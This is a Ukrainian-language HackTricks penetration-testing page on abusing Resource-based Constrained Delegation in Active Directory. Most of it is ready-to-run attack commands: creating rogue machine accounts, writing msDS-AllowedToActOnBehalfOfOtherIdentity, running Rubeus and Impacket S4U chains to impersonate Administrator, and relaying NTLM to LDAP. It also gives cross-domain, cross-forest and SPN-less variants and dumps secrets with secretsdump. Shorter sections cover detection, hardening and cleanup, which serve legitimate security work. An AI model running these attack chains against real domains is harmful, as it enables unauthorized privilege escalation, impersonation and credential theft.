# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Основи Resource-based Constrained Delegation

Це схоже на базову [Constrained Delegation](constrained-delegation.md), але **замість** надання дозволів **об’єкту** на **імперсонацію будь-якого користувача проти машини**, Resource-based Constrain Delegation **встановлює** в **об’єкті, хто саме може імперсонувати будь-якого користувача проти нього**.

У цьому випадку обмежений об’єкт матиме атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з ім’ям користувача, який може імперсонувати будь-якого іншого користувача проти нього.

Ще одна важлива відмінність цієї Constrained Delegation від інших делегацій полягає в тому, що будь-який користувач із **правами запису до облікового запису машини** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) може встановити **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (в інших формах Delegation потрібні були привілеї domain admin).

### Нові поняття

У розділі про Constrained Delegation зазначалося, що для виконання **S4U2Self** потрібен прапорець **`TrustedToAuthForDelegation`** у значенні _userAccountControl_ користувача. Але це не зовсім так.\
Насправді навіть без цього значення можна виконати **S4U2Self** проти будь-якого користувача, якщо ви є **service** (маєте SPN), але якщо у вас **є `TrustedToAuthForDelegation`**, повернений TGS буде **Forwardable**, а якщо цього прапорця **немає**, повернений TGS **не буде** **Forwardable**.

Однак якщо **TGS**, використаний у **S4U2Proxy**, **НЕ є Forwardable**, спроба зловживання **basic Constrain Delegation** **не спрацює**. Але якщо ви намагаєтеся експлуатувати **Resource-Based constrain delegation**, це спрацює.

### Структура атаки

> Якщо у вас є **еквівалентні права запису** над обліковим записом **Computer**, ви можете отримати **привілейований доступ** до цієї машини.

Припустімо, що attacker уже має **еквівалентні права запису над комп’ютером-жертвою**.

1. Attacker **компрометує** обліковий запис, який має **SPN**, або **створює його** (“Service A”). Зверніть увагу, що будь-який _Admin User_ без будь-яких інших спеціальних привілеїв може **створити** до 10 об’єктів Computer (**_MachineAccountQuota_**) і встановити їм **SPN**. Отже, attacker може просто створити об’єкт Computer і встановити SPN.
2. Attacker **зловживає своїм правом WRITE** над комп’ютером-жертвою (ServiceB), щоб налаштувати **resource-based constrained delegation** і дозволити ServiceA імперсонувати будь-якого користувача проти цього комп’ютера-жертви (ServiceB).
3. Attacker використовує Rubeus для виконання **повної S4U-атаки** (S4U2Self і S4U2Proxy) від Service A до Service B для користувача, який має **привілейований доступ до Service B**.
1. S4U2Self (з облікового запису зі скомпрометованим/створеним SPN): запросити **TGS Administrator до мене** (Not Forwardable).
2. S4U2Proxy: використати **не Forwardable TGS** із попереднього кроку, щоб запросити **TGS** від **Administrator** до **хоста-жертви**.
3. Навіть якщо використовується не Forwardable TGS, оскільки ви експлуатуєте Resource-based constrained delegation, це спрацює.
4. Attacker може виконати **pass-the-ticket** і **імперсонувати** користувача, щоб отримати **доступ до ServiceB жертви**.

Щоб перевірити _**MachineAccountQuota**_ домену, можна використати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення комп'ютерного об'єкта

Ви можете створити комп'ютерний об'єкт у домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування Resource-based Constrained Delegation

**Використання модуля activedirectory PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної S4U attack (Windows/Rubeus)

Перш за все, ми створили новий Computer object із паролем `123456`, тому нам потрібен hash цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер атаку можна виконати:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків для додаткових служб, виконавши лише один запит за допомогою параметра `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Зверніть увагу, що користувачі мають атрибут "**Cannot be delegated**". Якщо для користувача цей атрибут має значення True, ви не зможете його impersonate. Цю властивість можна переглянути в bloodhound.

### Linux tooling: наскрізний RBCD за допомогою Impacket (2024+)

Якщо ви працюєте з Linux, можна виконати весь ланцюжок RBCD за допомогою офіційних інструментів Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Примітки
- Якщо підписування LDAP/LDAPS примусово увімкнено, використовуйте `impacket-rbcd -use-ldaps ...`.
- Надавайте перевагу AES-ключам; багато сучасних доменів обмежують RC4. Impacket і Rubeus підтримують потоки лише з AES.
- Impacket може переписувати `sname` ("AnySPN") для деяких інструментів, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD між доменами та між лісами

Якщо **delegating principal**, яким ви керуєте, знаходиться в **іншому домені** (або навіть в **іншому лісі**), ніж **resource computer**, зловживання все одно є **RBCD**, але потік квитків більше не відповідає звичній однодоменній схемі `S4U2Self -> S4U2Proxy`.

### RBCD між доменами: налаштування foreign principal за SID

Коли ви встановлюєте `msDS-AllowedToActOnBehalfOfOtherIdentity` з **іншого домену**, foreign machine/user може бути **недоступним для визначення за іменем** у LDAP цільового домену. У такому випадку налаштуйте запис delegation, використовуючи **SID** foreign principal замість його sAMAccountName/UPN.

Це особливо актуально під час relaying NTLM до LDAP за допомогою `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Примітки:
- `--sid` вказує `ntlmrelayx.py` розглядати `--escalate-user` як SID, що необхідно, коли delegating account є foreign для target domain.
- Навіть якщо tool виводить `User not found in LDAP`, запис delegation все одно може бути успішним, оскільки security descriptor зберігає foreign SID безпосередньо.

### Cross-domain RBCD: cross-realm S4U sequence

Після додавання foreign principal до `msDS-AllowedToActOnBehalfOfOtherIdentity` робочий cross-domain flow має такий вигляд:

1. Отримати **TGT** для delegating principal з його власного domain.
2. Запросити **referral TGT** для `krbtgt/<target-domain>`.
3. Запросити **cross-realm S4U2Self referral** для impersonated user на target-domain DC.
4. Запросити фактичний **S4U2Self** ticket для цього user назад у delegator domain.
5. Виконати **S4U2Proxy** у delegator domain, щоб отримати referral ticket для target domain.
6. Виконати фінальний **S4U2Proxy** на target-domain DC, щоб отримати service ticket для `cifs/host.target`, `host/host.target` тощо.

Саме тому стандартні Linux tools часто не працюють із cross-domain RBCD:
- request **realm** може відрізнятися від realm TGT, використаного в `TGS-REQ`
- chain потребує **незалежних кроків S4U2Proxy**, а не лише `S4U2Self` або `S4U2Self`, одразу після якого виконується один `S4U2Proxy`

### Cross-domain RBCD from Linux

Synacktiv опублікували реалізацію `getST.py` для Impacket, яка відтворює cross-realm sequence у Linux шляхом явної обробки двох KDC:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Операційно нові аргументи мають таке призначення:
- `-dc-ip`: DC **delegating** домену
- `-targetdomain`: домен **resource computer**
- `-targetdc`: DC **resource** домену

### Обмеження Cross-forest RBCD

Cross-forest RBCD має важливе обмеження: **користувач, якого потрібно імперсонувати, має належати до того самого forest, що й delegating principal**. Іншими словами, якщо контрольований вами machine account знаходиться у `valhalla.local`, а цільовий ресурс — у `asgard.local`, ви зазвичай **не можете імперсонувати довільних користувачів `asgard.local` для доступу до цього ресурсу через RBCD**.

Це все ще можна експлуатувати, коли:
- користувач із **delegating forest** є **local admin** (або має інші привілеї) на host ресурсу в іншому forest
- trust дозволяє необхідний шлях автентифікації, а foreign SID приймається в security descriptor цільового комп’ютера

### Особливості протоколу Cross-forest RBCD

Cross-forest RBCD — це не просто «cross-domain плюс trust». Спостережуваний flow містить дві особливості, які звичайні інструменти історично пропускають:

1. Додатковий запит **S4U2Proxy**, який встановлює **`PA-PAC-OPTIONS=branch-aware`**
2. Фінальний service ticket може бути повернений із використанням **RC4**, навіть якщо було запитано інші etypes

Практичний flow:

1. Отримати TGT для delegating principal у forest A.
2. Запросити **S4U2Self** для impersonated user у forest A.
3. Запросити **S4U2Proxy** у forest A, щоб отримати referral TGT для forest B.
4. Надіслати другий **S4U2Proxy** у forest A **без S4U2Self ticket як additional ticket**, але з увімкненим `branch-aware`, щоб отримати ще один referral TGT для forest B.
5. За потреби запросити звичайний service ticket у forest B для delegating principal (цей ticket не потрібен для фінальної експлуатації).
6. Використати referral tickets із кроків 3 і 4, щоб запросити фінальний **S4U2Proxy** ticket у forest B для impersonated forest-A user до цільового SPN.

### Cross-forest RBCD з Linux

Та сама гілка Synacktiv Impacket додає перемикач `-forest` для цієї логіки:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Рекурсивний RBCD у кількох доменах (3+ домени)

У **forests із кількома доменами** і **S4U2Self**, і **S4U2Proxy** можуть бути **рекурсивними**, а не зупинятися після одного referral:

- **Рекурсивний S4U2Self**: перший `S4U2Self` надсилається до **домену impersonated user**, проміжні переходи між батьківським і дочірнім доменами проходяться за допомогою звичайних referral у `TGS-REQ` для `krbtgt/<REALM>`, а **фінальний `S4U2Self`** надсилається у **власному домені delegating principal**.
- Це означає, що **самого володіння TGT** для machine account може бути достатньо, щоб impersonate **admin з іншого домену в тому самому forest** і запросити `cifs/host`, `host/host`, `wsman/host` тощо.
- **Рекурсивний S4U2Proxy** проходить trust chain так само: на проміжних переходах попередній ticket повторно використовується як TGT під час запиту наступного referral для `krbtgt/<REALM>`, і лише останній перехід повертає фінальний service ticket.

Практичний приклад у тому самому forest:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less міждоменний / міжлісовий RBCD

Якщо **delegating principal є користувачем без SPN**, останній рекурсивний `S4U2Self` завершується помилкою **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Обхідний шлях — **повторити лише фінальний hop як `S4U2Self+U2U`**.

Скорочена версія ланцюжка abuse:

1. Автентифікуватися за допомогою **NT hash**, щоб KDC використовував **RC4-HMAC (etype 23)**.
2. Спочатку запросити **`-self -u2u`** і зберегти цей ticket окремо від подальшого proxy-кроку.
3. Витягнути ключ сеансу **TGT** за допомогою `describeTicket.py`.
4. Замінити **NT hash** користувача на цей **ключ сеансу** за допомогою `changepasswd.py -newhashes <session_key>`.
5. Повторно використати ticket **`S4U2Self+U2U`** як **`-additional-ticket`** під час окремого запиту **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Операційні застереження:

- Якщо **перший trusted hop уже веде до іншого forest**, надавайте перевагу **branch-aware** алгоритму (`getST.py ... -forest`), щоб відповідати нативній поведінці Windows. Якщо foreign forest досягається лише **пізніше** в ланцюжку, non-branch-aware рекурсивний flow усе ще може працювати.
- На нових **Windows Server 2022/2025** DC примусове використання RC4 може завершитися помилкою **`KDC_ERR_ETYPE_NOSUPP`** через поступову відмову від RC4; через це **SPN-less RBCD** може бути неможливим, хоча класичний RBCD із SPN усе ще працює з AES.
- Виконайте **`S4U2Self+U2U` до зміни hash/password користувача**: `SamrChangePasswordUser` **не перераховує AES keys Kerberos облікового запису, тому зміна password спочатку може порушити подальші запити ticket**.
- Обліковий запис, що impersonate, усе ще має бути delegable: **Protected Users** і облікові записи з **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** блокують ланцюжок.

## Примітки щодо виявлення / hardening

- RBCD-шляхи між domain/forest зазвичай усе ще створюються через **ACL abuse** або **relay-to-LDAP**. Увімкніть **LDAP signing** і **LDAP channel binding** на DC, щоб заблокувати поширені шляхи підготовки.
- Перевірте, хто може записувати `msDS-AllowedToActOnBehalfOfOtherIdentity` в об’єкти computer, і визначте збережені SIDs, включно з **foreign security principals**.
- У середовищах із великою кількістю trust перевірте **Selective Authentication**, **SID filtering** і те, чи мають користувачі з foreign forest права **local admin** на resource hosts.

### Доступ

Останній командний рядок виконає **повну S4U attack і введе TGS** від Administrator до victim host у **memory**.\
У цьому прикладі було запитано TGS для service **CIFS** від Administrator, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними сервісними квитками

Дізнайтеся про [**доступні сервісні квитки тут**](silver-ticket.md#available-services).

## Перерахування, аудит і очищення

### Перерахування комп’ютерів із налаштованим RBCD

PowerShell (декодування SD для розпізнавання SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (прочитати або очистити однією командою):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Очищення / скидання RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви надаєте лише хеш RC4. Надайте Rubeus щонайменше хеш AES256 (або просто надайте йому хеші rc4, aes128 і aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** під час `-self` для звичайного користувача: делегуючий principal, імовірно, **не має SPN**. Повторіть **останній hop** як **`S4U2Self+U2U`** замість звичайного **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** під час **SPN-less RBCD**: нові DC можуть відхиляти примусовий шлях **RC4-HMAC**, необхідний для трюку з **`S4U2Self+U2U`** і підміною session key. Натомість спробуйте класичний **SPN-backed** шлях RBCD з AES.
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп'ютері відрізняється від часу на DC, через що Kerberos працює некоректно.
- **`preauth_failed`**: Це означає, що вказані username + hashes не працюють для входу. Можливо, ви забули додати `"$"` до username під час генерації hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтеся impersonate, не може отримати доступ до бажаного service (оскільки його не можна impersonate або він не має достатніх privileges)
- Запитуваний service не існує (якщо ви запитуєте ticket для winrm, але winrm не запущений)
- Створений fakecomputer втратив свої privileges над вразливим server, і вам потрібно повернути їх.
- Ви зловживаєте classic KCD; пам'ятайте, що RBCD працює з non-forwardable S4U2Self tickets, тоді як KCD вимагає forwardable.

## Примітки, relays та альтернативи

- Ви також можете записати RBCD SD через AD Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains часто завершуються RBCD, щоб за один крок отримати local SYSTEM. Дивіться практичні end-to-end приклади:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо LDAP signing/channel binding **вимкнено** і ви можете створити machine account, такі tools, як **KrbRelayUp**, можуть relay примусово отриману Kerberos auth до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для вашого machine account в об'єкті target computer і негайно impersonate **Administrator** через S4U з off-host.

## Посилання

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
